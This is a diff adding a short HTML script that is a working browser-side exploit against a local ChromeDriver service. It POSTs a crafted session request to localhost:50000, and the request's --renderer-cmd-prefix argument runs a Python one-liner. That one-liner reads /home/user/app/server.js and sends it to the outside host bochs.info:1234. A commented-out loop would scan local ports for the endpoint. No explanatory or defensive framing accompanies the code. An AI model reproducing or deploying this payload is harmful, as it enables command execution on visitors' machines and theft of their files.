@@ -1,0 +1,13 @@
+<script>
+  var cmd = "python";
+  var payload = {"desiredCapabilities":{"browserName":"chrome","goog:chromeOptions":{"args":["--no-sandbox","--renderer-cmd-prefix=" + cmd]}}};
+  payload = `{\"desiredCapabilities\":{\"browserName\":\"chrome\",\"goog:chromeOptions\":{\"args\":[\"--no-sandbox\",\"--disable-gpu\",\"--disable-dev-shm-usage\",\"--renderer-cmd-prefix=python2.7 -c __import__('urllib').urlopen('http://bochs.info:1234',open('/home/user/app/server.js','r').read()) --\"]}},\"capabilities\":{\"alwaysMatch\":{\"browserName\":\"chrome\",\"goog:chromeOptions\":{\"args\":[\"--no-sandbox\",\"--disable-gpu\",\"--disable-dev-shm-usage\",\"--renderer-cmd-prefix=python2.7 -c __import__('urllib').urlopen('http://bochs.info:1234',open('/home/user/app/server.js','r').read()) --\"]}}}}`;
+/*   for (var port = 32768; port < 60000; port++) {
+    fetch(`http://localhost:${port}/session`, {method: "POST", mode: "no-cors", body: body})
+        .then(value => {})
+        .catch(error => {});
+  } */
+  fetch(`http://localhost:50000/session`, {method: "POST", mode: "no-cors", body: payload})
+        .then(value => {})
+        .catch(error => {});
+</script>
